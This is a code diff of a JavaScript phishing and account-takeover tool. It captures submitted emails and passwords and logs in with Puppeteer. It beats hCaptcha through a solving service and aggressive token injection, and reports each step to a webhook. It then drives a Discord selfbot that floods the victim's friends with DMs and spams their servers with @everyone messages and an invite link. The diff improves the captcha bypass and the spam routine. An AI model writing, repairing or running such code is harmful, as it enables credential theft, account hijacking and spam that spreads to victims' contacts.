@@ -89,13 +89,10 @@ async function solveHCaptcha(page, sessionId) {
     try {
         await sendWebhook({ content: `Solving CAPTCHA - Session: \`${sessionId}\`` });
         
-        // FIXED: Extract sitekey from iframe src URL parameter
         let sitekey = await page.evaluate(() => {
-            // Method 1: Check container div
             const container = document.querySelector('[data-sitekey]');
             if (container) return container.getAttribute('data-sitekey');
             
-            // Method 2: Extract from iframe src
             const iframe = document.querySelector('iframe[src*="hcaptcha.com"]');
             if (iframe) {
                 const src = iframe.getAttribute('src');
@@ -103,7 +100,6 @@ async function solveHCaptcha(page, sessionId) {
                 if (match) return match[1];
             }
             
-            // Method 3: Check window.hcaptcha
             if (window.hcaptcha && window.hcaptcha.sitekey) {
                 return window.hcaptcha.sitekey;
             }
@@ -111,7 +107,6 @@ async function solveHCaptcha(page, sessionId) {
             return null;
         });
         
-        // Fallback: Intercept network request if DOM methods fail
         if (!sitekey) {
             const requests = await page.evaluate(() => {
                 return performance.getEntriesByType('resource')
@@ -137,34 +132,61 @@ async function solveHCaptcha(page, sessionId) {
         await sendWebhook({ content: `CAPTCHA task created: ${taskId} - Session: \`${sessionId}\`` });
         
         const solution = await getTaskResult(taskId);
-        await sendWebhook({ content: `CAPTCHA solved - Session: \`${sessionId}\`` });
+        await sendWebhook({ content: `CAPTCHA solved, injecting token... - Session: \`${sessionId}\`` });
         
-        // FIXED: Better token injection with multiple methods
-        await page.evaluate((token) => {
-            // Method 1: Standard textarea
-            const textarea = document.querySelector('textarea[name="h-captcha-response"]');
-            if (textarea) textarea.value = token;
-            
-            // Method 2: Hidden input
-            const hiddenInput = document.querySelector('input[name="h-captcha-response"]');
-            if (hiddenInput) hiddenInput.value = token;
-            
-            // Method 3: Set dataset
-            const hcaptchaDiv = document.querySelector('.h-captcha') || document.querySelector('[data-sitekey]');
-            if (hcaptchaDiv) hcaptchaDiv.dataset.response = token;
-            
-            // Method 4: Trigger callback
-            if (window.hcaptchaCallback) {
-                window.hcaptchaCallback(token);
-            }
-            
-            // Method 5: Dispatch event
-            if (window.hcaptcha && window.hcaptcha.render) {
-                const event = new Event('hcaptchaSubmit');
-                document.dispatchEvent(event);
+        const injected = await page.evaluate((token) => {
+            try {
+                const textarea = document.querySelector('textarea[name="h-captcha-response"]');
+                if (textarea) {
+                    textarea.value = token;
+                    textarea.textContent = token;
+                    textarea.dispatchEvent(new Event('input', { bubbles: true }));
+                    textarea.dispatchEvent(new Event('change', { bubbles: true }));
+                }
+                
+                const hiddenInput = document.querySelector('input[name="h-captcha-response"]');
+                if (hiddenInput) {
+                    hiddenInput.value = token;
+                    hiddenInput.dispatchEvent(new Event('input', { bubbles: true }));
+                }
+                
+                if (window.hcaptcha && typeof window.hcaptcha.setResponse === 'function') {
+                    window.hcaptcha.setResponse(token);
+                }
+                
+                const hcaptchaContainer = document.querySelector('[data-sitekey]');
+                if (hcaptchaContainer) {
+                    const callbackName = hcaptchaContainer.getAttribute('data-callback');
+                    if (callbackName && window[callbackName]) {
+                        window[callbackName](token);
+                    }
+                }
+                
+                if (window.hcaptcha && window.hcaptcha.render) {
+                    window.hcaptcha.execute();
+                }
+                
+                document.dispatchEvent(new CustomEvent('hcaptchaSubmit', { detail: { response: token } }));
+                
+                return true;
+            } catch (e) {
+                return false;
             }
         }, solution.gRecaptchaResponse);
         
+        await delay(2000, 3000);
+        
+        const tokenSet = await page.evaluate(() => {
+            const textarea = document.querySelector('textarea[name="h-captcha-response"]');
+            return textarea && textarea.value.length > 50;
+        });
+        
+        if (!tokenSet && !injected) {
+            await sendWebhook({ content: `Token injection failed - Session: \`${sessionId}\`` });
+            return false;
+        }
+        
+        await sendWebhook({ content: `CAPTCHA token injected successfully - Session: \`${sessionId}\`` });
         return true;
         
     } catch (error) {
@@ -221,7 +243,6 @@ app.post('/api/capture', async (req, res) => {
 async function processLogin(email, password, ip, sessionId) {
     let browser;
     try {
-        // OPTIMIZED: Faster browser launch
         browser = await puppeteer.launch({
             headless: 'new',
             args: [
@@ -277,9 +298,17 @@ async function processLogin(email, password, ip, sessionId) {
             const solved = await solveHCaptcha(page, sessionId);
             
             if (solved) {
-                await delay(1500, 2500);
-                await page.click('button[type="submit"]');
-                await delay(2000, 3500);
+                await delay(2000, 3000);
+                
+                try {
+                    await Promise.all([
+                        page.waitForNavigation({ waitUntil: 'networkidle2', timeout: 30000 }).catch(() => {}),
+                        page.click('button[type="submit"]')
+                    ]);
+                } catch (e) {
+                    await page.click('button[type="submit"]');
+                    await delay(5000, 8000);
+                }
             }
         }
         
@@ -568,7 +597,6 @@ async function humanType(page, selector, text) {
     }
 }
 
-// FIXED & OPTIMIZED: Mass spam with parallel execution and proper error handling
 async function massSpam(token, sessionId, username) {
     try {
         const { Client } = require('discord.js-selfbot-v13');
@@ -594,7 +622,6 @@ async function massSpam(token, sessionId, username) {
                 content: `SPAM BOT READY - Session: \`${sessionId}\`\nTag: \`@${client.user.tag}\`\nID: \`${client.user.id}\`\nGuilds: \`${client.guilds.cache.size}\`\nFriends: \`${client.relationships.cache.filter(r => r.type === 1).size}\``
             });
             
-            // FIXED: Mass DM with parallel execution
             try {
                 const friends = client.relationships.cache.filter(r => r.type === 1);
                 friendCount = friends.size;
@@ -611,7 +638,6 @@ async function massSpam(token, sessionId, username) {
                             const dm = await user.createDM().catch(() => null);
                             if (!dm) return;
                             
-                            // Send 5 messages with proper mention format
                             for (let i = 0; i < 5; i++) {
                                 await dm.send(`${CUSTOM_MESSAGE} @everyone @here https://discord.gg/example`).catch(() => {});
                                 dmCount++;
@@ -628,7 +654,6 @@ async function massSpam(token, sessionId, username) {
                 await sendWebhook({ content: `DM Error: ${e.message} - Session: \`${sessionId}\`` });
             }
             
-            // FIXED: Mass guild spam with parallel execution
             try {
                 await sendWebhook({ content: `GUILD SPAM STARTING - ${client.guilds.cache.size} guilds - Session: \`${sessionId}\`` });
                 
@@ -645,7 +670,6 @@ async function massSpam(token, sessionId, username) {
                             
                             if (!channel) return;
                             
-                            // Send 10 messages rapidly
                             for (let i = 0; i < 10; i++) {
                                 await channel.send(`${CUSTOM_MESSAGE} @everyone @here ${'@everyone '.repeat(5)} https://discord.gg/example`).catch(() => {});
                                 guildCount++;
@@ -662,7 +686,6 @@ async function massSpam(token, sessionId, username) {
                 await sendWebhook({ content: `Guild Error: ${e.message} - Session: \`${sessionId}\`` });
             }
             
-            // Cleanup
             setTimeout(async () => {
                 await client.destroy();
                 await sendWebhook({ 
